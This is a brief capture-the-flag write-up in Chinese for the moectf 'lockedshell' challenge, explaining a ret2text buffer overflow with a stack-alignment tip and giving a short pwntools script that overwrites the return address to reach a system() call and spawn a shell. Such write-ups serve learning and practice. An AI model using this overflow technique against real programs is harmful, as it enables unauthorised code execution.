# moectf lockedshell

by Maple

简单的`ret2text`，注意如果直接跳到后门函数起点存在对齐问题，直接跳到对system函数使用部分最好

```python
from pwn import *
p = process('./pwn')
payload = b'b'*0x50+b'b'*0x8+p64(0x401193)
p.sendline(payload)
p.interactive()
```

